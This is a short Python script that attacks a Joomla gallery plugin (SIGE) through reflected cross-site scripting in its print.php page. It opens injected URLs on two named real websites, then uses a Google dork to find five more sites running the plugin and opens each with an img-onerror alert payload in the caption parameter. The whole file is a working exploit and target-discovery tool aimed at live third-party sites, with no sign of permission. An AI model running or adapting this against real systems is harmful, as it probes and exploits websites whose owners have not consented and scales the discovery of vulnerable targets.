import webbrowser
import re
from googlesearch import search 

#you can also change it with 
browser = "firefox"

# XSS in the name field
url1 = "http://www.colorator.net/plugins/content/sige/plugin_sige/print.php?img=http://www.colorator.net/images/Transport/off_road_cars/1/10.gif"
webbrowser.open(url1 + "&name=Hi, it seems there is missing some input filtering... I'm changing the name of this picture from the url!")

url2 = "https://moi-raskraski.ru/plugins/content/sige/plugin_sige/print.php?img=http://moi-raskraski.ru%2Fimages%2Fraskraski%2Fderevo%2Fpalma%2Fraskraska-derevo-palma-1.jpg"
webbrowser.open_new_tab(url2 + "&name=\"<img%20src=x%20onerror=alert(%27Hackerino%27)>\"")
  
# GOOGLE DORKING to search a joomla website using sige plugin 
query = "allinurl:/plugins/content/sige/plugin_sige/print.php?"

# look for the first 5 results and try to substitute the vulnarable url pattern with an alert tag
for j in search(query, tld="co.in", num=5, stop=5, pause=2): 
	x = re.split("print.php?", j)

	#print("your link requested: " + j)

	print(x[0]+"print.php?img=x&caption=<img%20src=x%20onerror=alert(%27Hackerino%27)>")

	webbrowser.open_new_tab(x[0]+"print.php?img=x&caption=<img%20src=x%20onerror=alert(%27Hackerino%27)>")
